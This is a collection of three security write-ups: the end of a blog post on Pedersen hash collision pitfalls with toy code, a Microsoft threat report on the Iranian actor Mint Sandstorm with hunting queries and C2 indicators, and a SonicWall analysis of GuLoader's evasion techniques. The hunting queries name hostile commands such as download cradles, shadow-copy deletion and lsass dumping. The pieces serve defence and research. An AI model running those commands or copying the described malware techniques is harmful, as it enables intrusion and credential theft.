+ 35 ⋅ ⟨M2⟩ ≡ 129 mod 139. \n
One can see the previous equation holds for ⟨M1⟩ = 17 and ⟨M2⟩ = 31.
Since Zcash’s encoding is injective, one can decode these values and obtain M1 = "000000", M2 = "001100", which collides with the original message, as shown below.\n
# We need to find a message M' = M1' || M2' such that\n# <M1'>
+ 35*<M2'> =  (-29 -35*63 ) = 129 mod 139\nH2 = GenericPedersenHash(GENERATORS, [17, 31])\nassert H == H2\n\nH3 = ZcashPedersenHash(["000000", "001100"])\nassert H == H3\n
This shows how important it is that the generators be sampled in such a way that no ones knows the discrete logarithm of one with respect to the other one, not even the hash function designers.\n
Vulnerability 3: Variable-length Input\nWhile implementations usually set a fixed upper bound to the size of the input that can be hashed, they also sometimes accept arbitrary-long (or short) inputs.
Zcash’s definition of Pedersen hash is unequivocal regarding the collision-resistance of the hash function when using variable-length input, as stated on page 78 of [Zcash]:\n\nThese hash functions are not collision-resistant for variable-length inputs.\n\n\n
One reason why allowing inputs of different sizes to be hashed may result in collisions is that padding is applied to the inputs prior to encoding them.
This padding step is sometimes explicit, for example as described in the Zcash protocol specification [Zcash], where the definition of PedersenHashToPoint on page 78 specifies the following padding scheme.\n\n
Pad to a multiple of 3 bits by appending zero bits, giving ′.\n\n
But this padding step may also be implicit, such as when using the “identity” encoding and hashing messages of unexpected lengths.
In that case, the missing or superfluous bits would simply be interpreted as zeros.
We illustrate the issue with our toy example.\n
In the following code snippet, we see how we can craft a message colliding with msg by trimming or appending zero bits at the end of the message.\n
# ======================================== #\n# Vulnerability 3 - Variable-length Input  #\n# ======================================== #\n\nmessage =
["010101", "111000"]\ncolliding_message =
[message[0] + "000", message[1][:3]]\nprint(f"Colliding Message: {colliding_message}")\n
# Colliding Message:  
['010101000', '111']\n\nassert PedersenHash(colliding_message) == PedersenHash(message)\n
In addition to issues that are exclusively related to padding, the ability to hash larger messages may break injectivity of the function.
The toy example in the Definition section also illustrated how hashing messages larger than the expected size may lead to collisions.\n
Conclusion\nWhile the Pedersen hash function has many desirable advantages due to its simplicity, efficiency in arithmetic circuits, and the known security assumption it relies on, it is also susceptible to many pitfalls.
Specifically, implementations adapting the Zcash approach but on different curves or with different encoding schemes may result in fragile constructions vulnerable to subtle issues, as illustrated in this blog post.\n
The source code is located at https://github.com/ncc-pbottine/ToyPedersenHash/.\nAcknowledgements\nThe author would like to thank Kevin Henry, Aleksandar Kircanski and Giacomo Pope of NCC Group’s Cryptography Services team for their diligent review of this post and Daniele Di Benedetto from Horizen Labs for having drawn our attention to some of the interesting problems described in this blog post.
All remaining inaccuracies are the sole responsibility of the author.\n
References\n[Zcash]: Daira Hopwood, Sean Bowe, Taylor Hornby, Nathan Wilcox.
Zcash Protocol Specification Version 2022.3.8
[NU5].
September 15, 2022.
URL: https://zips.z.cash/protocol/protocol.pdf.\n
[CHP91]: David Chaum, Eugène van Heijst, and Birgit Pfitzmann.
Cryptographically Strong Undeniable Signatures, Unconditionally Secure for the Signer.
February 1991.
URL: https://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.34.8570.\n
[Ped91]: Pedersen, T.P. Non-Interactive and Information-Theoretic Secure Verifiable Secret Sharing. 1991.
URL:
https://doi.org/10.1007/3-540-46766-1_9\n
title: Nation-state threat actor Mint Sandstorm refines tradecraft to attack high-value targets url: https://www.microsoft.com/en-us/security/blog/2023/04/18/nation-state-threat-actor-mint-sandstorm-refines-tradecraft-to-attack-high-value-targets/ Over the past several months, Microsoft has observed a mature subgroup of Mint Sandstorm, an Iranian nation-state actor previously tracked as PHOSPHORUS, refining its tactics, techniques, and procedures (TTPs).
Specifically, this subset has rapidly weaponized N-day vulnerabilities in common enterprise applications and conducted highly-targeted phishing campaigns to quickly and successfully access environments of interest.
This Mint Sandstorm subgroup has also continued to develop and use custom tooling in selected targets, notably organizations in the energy and transportation sectors.
Given this subgroup’s capabilities, the profile of past targets, and the potential for cascading effects, Microsoft is publishing details on known tradecraft alongside corresponding detections and mitigations to help organizations protect against this and similar threats. 
Who is Mint Sandstorm? Mint Sandstorm is Microsoft’s new name for PHOSPHORUS, an Iranian nation-state actor.
This new name is part of the new threat actor naming taxonomy we announced today, designed to keep pace with the evolving and growing threat landscape. 
Mint Sandstorm is known to pursue targets in both the private and public sectors, including political dissidents, activist leaders, the Defense Industrial Base (DIB), journalists, and employees from multiple government agencies, including individuals protesting oppressive regimes in the Middle East. 
Activity Microsoft tracks as part of the larger Mint Sandstorm group overlaps with public reporting on groups known as APT35, APT42, Charming Kitten, and TA453. 
Mint Sandstorm is a composite name used to describe several subgroups of activity with ties to the same organizational structure.
Microsoft assesses that Mint Sandstorm is associated with an intelligence arm of Iran’s military, the Islamic Revolutionary Guard Corps (IRGC), an assessment that has been corroborated by multiple credible sources including Mandiant, Proofpoint, and SecureWorks. 
In 2022, the US Department of Treasury sanctioned elements of Mint Sandstorm for past cyberattacks citing sponsorship from the IRGC. 
Today, Microsoft is reporting on a distinct Mint Sandstorm subgroup that specializes in hacking into and stealing sensitive information from high-value targets.
This Mint Sandstorm subgroup is technically and operationally mature, capable of developing bespoke tooling and quickly weaponizing N-day vulnerabilities, and has demonstrated agility in its operational focus, which appears to align with Iran’s national priorities. 
Microsoft Threat Intelligence consistently tracks threat actor activity, including Mint Sandstorm and its subgroups, and works across Microsoft Security products and services to build detections into our products that improve protection for customers.
As with any observed nation state actor activity, Microsoft directly notifies customers that have been targeted or compromised, providing them with the information they need to secure their accounts.
Microsoft is sharing details on these operations to raise awareness on the risks associated with their activity and to empower organizations to harden their attack surfaces against tradecraft commonly used by this Mint Sandstorm subgroup. 
Recent operations From late 2021 to mid-2022, this Mint Sandstorm subgroup moved from reconnaissance to direct targeting of US critical infrastructure including seaports, energy companies, transit systems, and a major US utility and gas entity potentially in support of retaliatory destructive cyberattacks.
This targeting was likely in response to Iran’s attribution of cyberattacks that halted maritime traffic at a major Iranian seaport in May 2020, delayed Iranian trains in July 2021, and crashed gas station payment systems throughout Iran in late 2021.
Of note, a senior cybersecurity-focused IRGC official and others close to the Iranian Supreme Leader pinned the attack affecting gas station payment systems on Israel and the United States. 
This targeting also coincided with a broader increase in the pace and the scope of cyberattacks attributed to Iranian threat actors, including another Mint Sandstorm subgroup, that Microsoft observed beginning in September 2021.
The increased aggression of Iranian threat actors appeared to correlate with other moves by the Iranian regime under a new national security apparatus, suggesting such groups are less bounded in their operations. 
Given the hardline consensus among policymakers in Tehran and sanctions previously levied on Iran’s security organizations, Mint Sandstorm subgroups may be less constrained in carrying out malicious cyber activity. 
Mint Sandstorm tradecraft Microsoft has observed multiple attack chains and various tools in compromises involving this Mint Sandstorm subgroup.
The TTPs detailed below area sampling of new or otherwise notable tradecraft used by this actor. 
Rapid adoption of publicly disclosed POCs for initial access and persistence Microsoft has increasingly observed this Mint Sandstorm subgroup adopting publicly disclosed proof-of-concept (POC) code shortly after it is released to exploit vulnerabilities in internet-facing applications.
Until 2023, this subgroup had been slow to adopt exploits for recently-disclosed vulnerabilities with publicly reported POCs, often taking several weeks to successfully weaponize exploits for vulnerabilities like Proxyshell and Log4Shell.
However, beginning in early 2023, Microsoft observed a notable decrease in the time required for this subgroup to adopt and incorporate public POCs.
For example, Mint Sandstorm began exploiting CVE-2022-47966 in Zoho ManageEngine on January 19, 2023, the same day the POC became public.
They later exploited CVE-2022-47986 in Aspera Faspex within five days of the POC being made public on February 2, 2023. 
While this subgroup has demonstrated their ability to rapidly incorporate new public POCs into their playbooks, Microsoft has also observed that Mint Sandstorm continues to use older vulnerabilities, especially Log4Shell, to compromise unpatched devices.
As this activity is typically opportunistic and indiscriminate, Microsoft recommends that organizations regularly patch vulnerabilities with publicly available POCs, regardless of how long the POC has been available. 
After gaining initial access to an organization by exploiting a vulnerability with a public POC, this Mint Sandstorm subgroup deploys a custom PowerShell script designed for discovery.
In some cases, the subgroup does not act on the information they collect, possibly because they assess that a victim does not meet any targeting requirements or because the subgroup wishes to wait and focus on more valuable targets.
In cases where Mint Sandstorm operators continue their pursuit of a given target, Microsoft typically observes one of two possible attack chains. 
Figure 1.
The two attack chains used by the Mint Sandstorm subgroup Attack chain 1: The Mint Sandstorm subgroup proceeds using Impacket to move laterally through a compromised organization and relies extensively on PowerShell scripts (rather than custom implants) to enumerate admin accounts and enable RDP connections.
In this attack chain, the subgroup uses an SSH tunnel for command and control (C2), and the final objective in many cases is theft of the Active Directory database.
If obtained, the Mint Sandstorm subgroup can use the Active Directory database to access credentials for users’ accounts.
In cases where users’ credentials are accessed and the target organization has not reset corresponding passwords, the actors can log in with stolen credentials and masquerade as legitimate users, possibly without attracting attention from defenders.
The actors could also gain access to other systems where individuals may have reused their passwords. 
Attack chain 2: As is the case in attack chain 1, the Mint Sandstorm subgroup uses Impacket to move laterally.
However, in this progression, the operators use webhook.site for C2 and create scheduled tasks for persistence.
Finally, in this attack chain, the actors deploy a custom malware variant, such as Drokbk or Soldier.
These custom malware variants signal an increase in the subgroup’s level of sophistication, as they shift from using publicly available tools and simple scripts to deploying fully custom developed malicious code. 
Use of custom tools to evade detection 
Since 2022,Microsoft has observed this Mint Sandstorm subgroup using two custom implants, detected by Microsoft security products as Drokbk and Soldier, to persist in target environments and deploy additional tools.
Drobkbk and Soldier both use Mint Sandstorm-controlled GitHub repositories to host a domain rotator containing the operators’ C2 domains.
This allows Mint Sandstorm to dynamically update their C2 infrastructure, which may help the operators stay a step ahead of defenders using list-based domain blocking. 
Drokbk: Drokbk.exe is a custom .NET implant with two components: an installer, sometimes accessed from a compressed archive on a legitimate file-sharing platform, and a secondary backdoor payload.
The Drokbk backdoor issues a web request to obtain the contents of a README file on a Mint Sandstorm-controlled GitHub repo.
The README file contains a list of URLs that direct targets to the C2 infrastructure associated with Drokbk. 
Soldier: Soldier is a multistage .NET backdoor with the ability to download and run additional tools and uninstall itself.
Like Drokbk, Soldier C2 infrastructure is stored on a domain rotator on a GitHub repository operated by Mint Sandstorm.
Microsoft Threat Intelligence analysts assess that Soldier is a more sophisticated variant of Drokbk. 
In certain cases, this Mint Sandstorm subgroup has used TTPs outside of these attack chains, notably when they have failed to achieve short-term objectives.
In one instance, Microsoft also observed the subgroup using TTPs from both attack chains in a single compromised environment.
However, in most cases, Mint Sandstorm activity displays one of the above discussed attack chains. 
Low-volume phishing campaigns using template injection Microsoft has also observed this Mint Sandstorm subgroup using a distinct attack chain involving low-volume phishing campaigns and a third custom implant. 
In these operations, the group crafts bespoke phishing emails, often purporting to contain information on security policies that affect countries in the Middle East, to deliver weaponized documents to individuals of interest.
Recipients are typically individuals affiliated with high-profile think tanks or universities in Israel, North America, or Europe with ties to the security and policy communities.
Unlike their initial exploitation of vulnerable internet-facing applications, which is largely indiscriminate and affects organizations across sectors and geographies, activity associated with this campaign was highly targeted and affected fewer than 10 organizations.. 
The initial emails are most commonly lures designed to social engineer recipients into clicking a OneDrive link hosting a PDF spoofed to resemble information on a topic involving security or policy in the Middle East.
The PDF contains a link to a macro-enabled template file (dotm) hosted on Dropbox.
This file has been weaponized with macros to perform remote template injection, a technique that allows operators to obtain and launch a payload from a remote C2, often OneDrive.
Template injection is an attractive option for adversaries looking to execute malicious code without drawing scrutiny from defenders.
This technique can also be used to persist in a compromised environment if an adversary replaces a default template used by a common application. 
In these attacks, Microsoft has observed the Mint Sandstorm subgroup using CharmPower, a custom implant, in attacks that began with targeted phishing campaigns. 
CharmPower is a modular backdoor written in PowerShell that this subgroup delivers in phishing campaigns that rely on template injection.
CharmPower can read files, gather information on an infected host, and send details back to the attackers. 
Reporting from Checkpoint indicates that at least one version of CharmPower pulls data from a specific text file that contains a hardcoded victim identifier. 
Figure 2.
Template injection technique What’s next Capabilities observed in intrusions attributed to this Mint Sandstorm subgroup are concerning as they allow operators to conceal C2 communication, persist in a compromised system, and deploy a range of post-compromise tools with varying capabilities.
While effects vary depending on the operators’ post-intrusion activities, even initial access can enable unauthorized access and facilitate further behaviors that may adversely impact the confidentiality, integrity, and availability of an environment.
A successful intrusion creates liabilities and may harm an organization’s reputation, especially those responsible for delivering services to others such as critical infrastructure providers, which Mint Sandstorm has targeted in the past. 
As these operators increasingly develop and use sophisticated capabilities, organizations must develop corresponding defenses to harden their attack surfaces and raise costs for these operators.
Microsoft will continue to monitor Mint Sandstorm activity and implement protections for our customers.
The current detections, advanced detections, and IOCs in place across our security products are detailed below and shared with the broader security community to help detect and prevent further attacks. 
Mitigation and protection guidance The techniques used by this subset of Mint Sandstorm can be mitigated through the following actions: 
Hardening internet-facing assets and understanding your perimeter Organizations must identify and secure perimeter systems that attackers might use to access the network.
Public scanning interfaces, such as Microsoft Defender External Attack Surface Management, can be used to improve data. 
Vulnerabilities observed in recent campaigns attributed to this Mint Sandstorm subgroup that defenders can identify and mitigate include: IBM Aspera Faspex affected by CVE-2022-47986: Organizations can remediate CVE-2022-47986 by upgrading to Faspex 4.4.2 Patch Level 2 or using Faspex 5.x which does not contain this vulnerability.
More details are available in IBM’s security advisory here. 
Zoho ManageEngine affected by CVE-2022-47966:
Organizations using Zoho ManageEngine products vulnerable to CVE-2022-47966 should download and apply upgrades from the official advisory as soon as possible.
Patching this vulnerability is useful beyond this specific campaign as several adversaries are exploiting CVE-2022-47966 for initial access. 
Apache Log4j2 (aka Log4Shell) (CVE-2021-44228 and CVE-2021-45046): Microsoft’s guidance for organizations using applications vulnerable to Log4Shell exploitation can be found here.
This guidance is useful for any organization with vulnerable applications and useful beyond this specific campaign, as several adversaries exploit Log4Shell to obtain initial access. 
This Mint Sandstorm subgroup has demonstrated its ability to rapidly adopt newly reported N-day vulnerabilities into its playbooks.
To further reduce organizational exposure, Microsoft Defender for Endpoint customers can use the threat and vulnerability management capability to discover, prioritize, and remediate vulnerabilities and misconfigurations. 
Reducing the attack surface Microsoft 365 Defender customers can also turn on attack surface reduction rules to harden their environments against techniques used by this Mint Sandstorm subgroup.
These rules, which can be configured by all Microsoft Defender Antivirus customers and not just those using the EDR solution, offer significant protection against the tradecraft discussed in this report. Block executable files from running unless they meet a prevalence, age, or trusted list criterion Block Office applications from creating executable content Block process creations originating from PSExec and WMI commands Additionally, in 2022, Microsoft changed the default behavior of Office applications to block macros in files from the internet, further minimizing the attack surface for operators like this subgroup of Mint Sandstorm. 
Microsoft 365 Defender detections Microsoft Defender Antivirus Microsoft Defender Antivirus detects the Drokbk implant as the following malware: Trojan:MSIL/Drokbk.A!dha Trojan:MSIL/Drokbk.
B!dha Trojan:MSIL/Drokbk.
C!dha Trojan:Win32/Drokbk.
C!dha Microsoft Defender Antivirus detects the Soldier implant as the following malware: Trojan:MSIL/SoldierAudio.A!dha Trojan:MSIL/SoldierAudio.
B!dha Trojan:MSIL/SoldierAudio.C!dha Microsoft Defender Antivirus detects the CharmPower implant as the following malware: 
TrojanDownloader:O97M/RooftopMelt.A!dha Microsoft Defender for Endpoint The following Microsoft Defender for Endpoint alerts can indicate associated threat activity: Phosphorus Actor activity detected Hunting queries Microsoft 365 Defender Microsoft 365 Defender customers can run the following query to find related activity in their networks: ManageEngine Suspicious Process Execution. DeviceProcessEvents | where InitiatingProcessFileName hasprefix "java" | where InitiatingProcessFolderPath has @"\manageengine\" or InitiatingProcessFolderPath has @"\ServiceDesk\" | where (FileName in~ ("powershell.exe", "powershell_ise.exe") and (ProcessCommandLine has_any ("whoami", "net user", "net group", "localgroup administrators", "dsquery", "samaccountname=", " echo ", "query session", "adscredentials", "o365accountconfiguration", "-dumpmode", "-ssh", "usoprivate", "usoshared", "Invoke-Expression", "DownloadString", "DownloadFile", "FromBase64String", "System.IO.Compression", "System.
IO.MemoryStream", "iex ", "iex(", "Invoke-WebRequest", "set-MpPreference", "add-MpPreference", "certutil", "bitsadmin") // "csvhost.exe", "ekern.exe", "svhost.exe", ".dmp" or ProcessCommandLine matches regex @"[-/–][Ee^]{1,2}[ncodema^]*\s[A-Za-z0-9+/=]{15,}")) or (FileName =~ "curl.exe" and ProcessCommandLine contains "http") or (FileName =~ "wget.exe" and ProcessCommandLine contains "http") or ProcessCommandLine has_any ("E:jscript", "e:vbscript") or ProcessCommandLine has_all ("localgroup Administrators", "/add") or ProcessCommandLine has_all ("reg add", "DisableAntiSpyware", @"\Microsoft\Windows Defender") or ProcessCommandLine has_all ("reg add", "DisableRestrictedAdmin", @"CurrentControlSet\Control\Lsa") or ProcessCommandLine has_all ("wmic", "process call create") or ProcessCommandLine has_all ("net", "user ", "/add") or ProcessCommandLine has_all ("net1", "user ", "/add") or ProcessCommandLine has_all ("vssadmin", "delete", "shadows") or ProcessCommandLine has_all ("wmic", "delete", "shadowcopy") or ProcessCommandLine has_all ("wbadmin", "delete", "catalog") or (ProcessCommandLine has "lsass" and ProcessCommandLine has_any ("procdump", "tasklist", "findstr")) | where ProcessCommandLine !contains "download.microsoft.com" and ProcessCommandLine !contains "manageengine.com" and ProcessCommandLine !contains "msiexec" Ruby AsperaFaspex Suspicious Process Execution. DeviceProcessEvents | where InitiatingProcessFileName hasprefix "ruby" | where InitiatingProcessFolderPath has @"aspera" | where (FileName in~ ("powershell.exe", "powershell_ise.exe") and (ProcessCommandLine has_any ("whoami", "net user", "net group", "localgroup administrators", "dsquery", "samaccountname=", " echo ", "query session", "adscredentials", "o365accountconfiguration", "-dumpmode", "-ssh", "usoprivate", "usoshared", "Invoke-Expression", "DownloadString", "DownloadFile", "FromBase64String"
, "System.IO.Compression", "System.
IO.MemoryStream", "iex ", "iex(", "Invoke-WebRequest", "set-MpPreference", "add-MpPreference", "certutil", "bitsadmin", "csvhost.exe", "ekern.exe", "svhost.exe", ".dmp") or ProcessCommandLine matches regex @"[-/–][Ee^]{1,2}[ncodema^]*\s[A-Za-z0-9+/=]{15,}")) or (FileName =~ "curl.exe" and ProcessCommandLine contains "http") or (FileName =~ "wget.exe" and ProcessCommandLine contains "http") or ProcessCommandLine has_any ("E:jscript", "e:vbscript") or ProcessCommandLine has_all ("localgroup Administrators", "/add") or ProcessCommandLine has_all ("reg add", "DisableAntiSpyware", @"\Microsoft\Windows Defender") or ProcessCommandLine has_all ("reg add", "DisableRestrictedAdmin", @"CurrentControlSet\Control\Lsa") or ProcessCommandLine has_all ("wmic", "process call create") or ProcessCommandLine has_all ("net", "user ", "/add") or ProcessCommandLine has_all ("net1", "user ", "/add") or ProcessCommandLine has_all ("vssadmin", "delete", "shadows") or ProcessCommandLine has_all ("wmic", "delete", "shadowcopy") or ProcessCommandLine has_all ("wbadmin", "delete", "catalog") or (ProcessCommandLine has "lsass" and ProcessCommandLine has_any ("procdump", "tasklist", "findstr")) Log4J Wstomcat Process Execution. DeviceProcessEvents | where InitiatingProcessFileName has "ws_tomcatservice.exe" and FileName !in~("repadmin.exe") Encoded watcher Function. 
DeviceProcessEvents | where FileName =~ "powershell.exe" and ProcessCommandLine hasprefix "-e" | extend SplitString = split(ProcessCommandLine, " ") | mvexpand SS = SplitString | where SS matches regex "^[A-Za-z0-9+/]{50,}[=]{0,2}$" | extend base64_decoded = replace(@'\0', '', make_string(base64_decode_toarray(tostring(SS)))) 
| where not(base64_decoded has_any(@"software\checker", "set folder to watch")) | where base64_decoded has_all("$hst", "$prt") or base64_decoded has_any("watcher", @"WAt`CH`Er()") 
Microsoft Sentinel Microsoft Sentinel customers can use the TI Mapping analytic (a series of analytics all prefixed with “TI map”) to automatically match the indicators mentioned in this blog post with data in their workspace.
If the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the analytics rule deployed in their Sentinel workspace.
More details on the Content Hub can be found here: https://learn.microsoft.com/azure/sentinel/sentinel-solutions-deploy 
In addition, Microsoft Sentinel customers can leverage the following content to hunt for and detect related activity in their environments: Log4J solution Potential Impacket Execution Commands executed by WMI on new hosts – potential Impacket Scheduled Task Hidden Remote Task Creation/Update using Schtasks Process Scheduled Task Creation or Update from User Writable Directory Exchange SSRF Autodiscover ProxyShell – Detection Indicators of compromise IndicatorTypeDescriptionSoldier.exeFile nameSoldier backdoorad55b4a40f9e52682d9d4f069914e09c941e8b77ca7b615e9deffccdfbc54145SHA256Soldier backdoor hashDrokbk.exeFile nameDrokbk backdoor64f39b85c1d784df1ca8eb895ac7eaf47bf39acf008ed4ae27a796ac0f841bSHA256Drokbk
backdoor hashsync-system-time[.]cfDomainDrokbk C2 infrastructureupdate-windows-security[.]tkDomainDrokbk C2 infrastructuredns-iprecords[.]tkDomainDrokbk C2 infrastructureuniversityofmhealth[.]bizDomainDrokbk C2 infrastructureoracle-java[.]cfDomainDrokbk C2 infrastructure54.39.202[.]0 IP addressDrokbk C2 infrastructure51.89.135[.]15IP
addressDrokbk C2 infrastructure51.89.169[.]201IP addressDrokbk C2 infrastructure51.89.187[.]222IP
addressDrokbk C2 infrastructureNY.docx.docxFile nameCharmPower lure document used for template injection57cc5e44fd84d98942c45799f367db78adc36a5424b7f8d9319346f945f64a72SHA256NY.docx.docx hashAbraham%20Accords%20Du.[.]docxFile nameCharmPower lure document used for template injection3dcdb0ffebc5ce6691da3d0159b5e811c7aa91f6d8fc204963d2944225b0119dSHA256Abraham%20Accords%20Du.[.]docx hashDocTemplate.dotmFile nameMalicious remote template document used in intrusions involving CharmPower65e48f63f455c94d3bf681acaf115caa6e1e60499362add49ca614458bbc4f85SHA256DocTemplate.dotmDntDocTemp.dotmFile nameMalicious remote template document used in intrusions involving CharmPower444075183ff6cae52ab5b93299eb9841dcd8b0321e3a90fb29260dc12133b6a2 SHA256DntDocTemp.dotm hash0onlyastep0[.]xyzDomainCharmPower C2 infrastructure0readerazone0[.]xyzDomainCharmPower C2 infrastructure0tryamore0[.]xyzDomainCharmPower C2 infrastructure References Iran: Background and U.S. Policy.
Congressional Research Service Cobalt Illusion Masquerades as Atlantic Council Employee.
Secureworks Apt42: Crooked Charms, Cons, and Compromises.
Mandiant Badblood: TA453 Targets US & Israel in Credential Phishing.
Proofpoint Treasury Sanctions IRGC-Affiliated Cyber Actors for Roles in Ransomware Activity.
U.S. Department of the Treasury Officials: Israel Linked to a Disruptive Cyberattack on Iranian Port Facility.
The Washington Post Iran Says Cyberattack Causes Widespread Disruption at Gas Stations.
Thomson Reuters Iran’s Evolving Approach to Asymmetric Naval Warfare.
The Washington Institute for Near East Policy Hackers breach Iran rail network, disrupt service | Reuters.
Reuters APT35 Exploits Log4J Vulnerability to Distribute New Modular PowerShell Toolkit.
Checkpoint Iran Says Gas Stations Were Target Of Cyberattack To Foment Unrest (iranintl.com) Complaint – Summons – Civil Cover Sheet.pdf (noticeofpleadings.com) 
The post Nation-state threat actor Mint Sandstorm refines tradecraft to attack high-value targets appeared first on Microsoft Security Blog. 
title: GuLoader Demystified:
Unraveling its Vectored Exception Handler Approach url: https://securitynews.sonicwall.com/xmlpost/guloader-demystified-unraveling-its-vectored-exception-handler-approach/ GuLoader Demystified:
Unraveling its Vectored Exception Handler Approach May 31, 2023 OVERVIEW SonicWall Capture Labs Research team recently observed a new variant of GuLoader (a.k.a Cloudeye).
GuLoader is a shellcode-based downloader, known for its numerous anti-analysis techniques and control flow obfuscation.
In latest variant of GuLoader it introduces new ways to raise exceptions that hamper complete analysis process and its execution under controlled environment. 
In this blog post, we will discuss Unpacking of GuLoader’s shellcodes. 
Understanding a new anti-debug technique deployed by GuLoader. 
Deep dive into GuLoader’s custom Vectored Exception Handler. 
Writing an IDAPython script to deobfuscate the control flow of shellcode and to make GuLoader’s analysis easy and fast. 
INTRODUCTION GuLoader is an advanced downloader first discovered in 2019 and since then it kept evolving, adding new anti-debugging techniques with its every new variant.
It downloads malicious payload including AgentTesla, Azorult and Ramcos RAT etc.
Currently GuLoader is spreading through malspam campaign and packed using NSIS installer. 
UNPACKING GULOADER’S SHELLCODE GuLoader’s shellcode is executed after three layers. 
Layer 1: Recent variant of GuLoader is spreading as NSIS Installer consisting of NSIS script, DLL plugin and encrypted shellcode’s file.
We need NSIS variant of 7-zip to extract the NSIS script, as typical installer of 7-zip is unable to extract the NSIS script. 
Fig 1.
Extracted files from NSIS installer. 
File “Hangarer.Man” contains shellcode of Layer 2 and an encrypted shellcode of Layer 3 which is main shellcode of GuLoader. 
System.dll is DLL file which exports multiple functions.
An Exported function named as “Call” is called by NSIS script.
This function is responsible to allocate and execute Layer 2 shellcode. 
Fig 2.
NSIS script calling Exported function Call. 
Call function allocates memory space and copies content of file Hangarer.
Man from offset 0x409 till last byte.
It then calls CallWindowProcW API.
First parameter of CallWindowProcW is lpPrevWndFunc.
lpPrevWndFunc is callback function, which is set to address of allocated memory space, which results in indirect execution of the Layer 2’s shellcode. 
Layer 2: Malware immediately decrypts the third layer which located at offset 0x1c9 in layer 2 and starts its execution. 
Fig 3.
Decryption of layer 3. 
Layer 3: It is the final GuLoader shellcode.
This shellcode has complex obfuscation, consisting of junk code, indirect function calls, dynamic API resolution, obfuscated arithmetic value calculations, using stack to decrypt strings, fake instructions, anti-debug, anti-vm, anti-analysis, anti-dump, anti-API hook, anti-emulation techniques. 
During analysis of this variant, we have identified a significant enhancement in GuLoader’s one of most effective anti-debug technique that it’s custom Vectored Exception Handler. 
Malware raises exceptions by executing cleverly crafted series of instructions.
Also it uses same instructions multiple times in shellcode to make it hard for reverser to perform static and dynamic analysis and to consume lot of time. 
Ultimate goal of GuLoader for using this anti-debug technique is to achieve runtime control flow obfuscation. 
GuLoader incorporates various evasions techniques.
Mentioning them below in order in which they are get executed. 
Scan the virtual memory for the strings related to analysis tools. 
Uses Heaven Gate technique to redirect it’s execution under x64 OS. 
Check QEMU emulator related strings. 
Patch DbgBreakPoint and DbgUiRemoteBreakin API used by debuggers. 
Uses EnumWindows API to enumerates windows. 
Uses NtSetInformationThread API with ThreadHideDebugger(0x11). 
Uses EnumDeviceDrivers and GetDeviceDriverBaseNameA APIs. 
Uses MsiEnumProductsA and MsiGetProductInfoA APIs. 
Uses OpenSCManagerA and EnumServicesStatusA APIs. 
Use NtQueryInformationProcess API with DebugPort(0x7). 
An Overview of the Payload’s Execution Sequence Create suspended child process of itself. 
In newly created process, it creates a section using genuine file to avoid AVs suspicious scanning.
In this case it was using mshtml.dll. Injects complete main shellcode in child process. 
Repeats executing the mentioned evasion techniques one more time. 
After successful bypass , it decrypts the c2 URL and download encrypted payload from c2. 
Generate the payload decryption key.
In analyzed sample, key length was 0x303 bytes. 
GuLoader allocates approximately 60MB of memory space for the payload of size few KBs.
It decrypts an encrypted payload, use process hollowing to inject decrypted payload into child process and resolves its Import Address Table. 
Lastly, it starts payload execution using the ZwCreateThreadEx API. Fig 4.
Snippet of Payload decryption function. 
All of the above-mentioned evasion techniques and payload execution sequences are already explained in detail in SonicWall Capture Labs Research team’s blog. 
NEW ENHANCED ANTI-DEBUG TECHNIQUE 
In the below section we will discuss Exception types and implementation. 
Decoding Vectored Exception Handler function. 
Writing IDAPython script to restore deobfuscate control flow. 
EXCEPTION TYPES & IMPLEMENTATION 
This variant of GuLoader has added two new additional exceptions EXCEPTION_ACCESS_VIOLATION & EXCEPTION_SINGLE_STEP compared to last variant it has only one exception EXCEPTION_BREAKPOINT exception.
We will discuss each exception and understand its pattern to write a script. 
EXCEPTION_ACCESS_VIOLATION (code 0xC0000005) 
When malware intentionally tries to write to an inaccessible memory address, exception EXCEPTION_ACCESS_VIOLATION is raised. 
Here, malware constructs zero by series of arithmetic calculations.
Then it tries to access memory address pointed by it, which raises exception as zero is inaccessible memory address. 
Fig 5.
EXCEPTION_ACCESS_VIOLATION instructions pattern. 
As we can see the constant values and operations (mov, xor, sub) are keeps varying for each exception raised. 
EXCEPTION_SINGLE_STEP (code 0x80000004) 
The FLAGS register is the status register that contains the current state of a x86 CPU.
The trap flag is 8th bit of FLAGS register.
When the trap flag is set, the system is instructed to single step, it will execute one instruction and then stop.
Then contents of registers and memory locations can be examined by Vectored Exception Handler; if they are correct, the system can execute the next instruction. 
The x86 processor has no instruction to directly set or reset the trap flag.
Malware uses combination of (PUSHFD/POPFD) instructions to set trap flag. 
These operations are done by. 
Pushing the flag register on the stack (PUSHFD) . 
Modifying the trap flag bit (uses 0x100) 
Popping the flag register back off the stack (POPFD). 
When malware is running without debugger, when SINGLE_STEP exception is raised and handled by Vectored Exception Handler. 
Fig 6. SINGLE_STEP
exception instructions pattern. 
However while using debugger, no exception can be seen being raised as trap flag is always gets reset after each debugger event is delivered. 
EXCEPTION_BREAKPOINT (code 0x80000003) INT3 instruction (0xCC opcode) is used as software breakpoint in debuggers, that’s why when program is running under debugger, control remains to the debugger after it encounter INT3. 
When malware is running without debugger exception EXCEPTION_BREAKPOINT is raised, and control is transferred to the Vectored Exception Handler. 
Fig 7.
BREAKPOINT exception instruction patterns. 
Now we have understood how exceptions are being raised by malware.
Next will see how malware uses these exceptions to change the control flow at runtime using its custom Vectored Exception Handler. DECODING VECTORED EXCEPTION HANDLER An application can register a function to handle all exceptions for the application.
Vectored handlers are called in the order that they were added. 
GuLoader call RtlAddVectoredExceptionHandler API to add its custom Vectored Exception Handler. RtlAddVectoredExceptionHandler accepts two parameters. 
Fig 8.
Structures of EXCEPTION RECORD & CONTEXT. 
As we can see in below image, pointer of structure EXCEPTION_POINTERS is being passed as an argument to Vectored Exception Handler(VEH).
Using structure EXCEPTION_POINTERS, VEH can access all the information regarding raised exceptions and reading the values of all the registers of processor using structure CONTEXT. 
Fig 9.
Pseudocode of Custom Vectored Exception Handler. 
When EXCEPTION_ACCESS_VIOLATION and SINGLE_STEP_EXCEPTION exceptions are raised, handler perform following steps: It checks whether memory address being currently accessed is zero or not.
If it is not zero, then it returns 0 and ultimately crashes down. 
But how handler gets the address of currently accessed memory location?
So it uses ExceptionInformantion[1] member of Exception Record to get this additional information about exception. 
Checks if any hardware breakpoints have been set by checking status of the debug registers(DR0 to DR7).
If found it set the ContextRecord to 0 which leads malware to crash. 
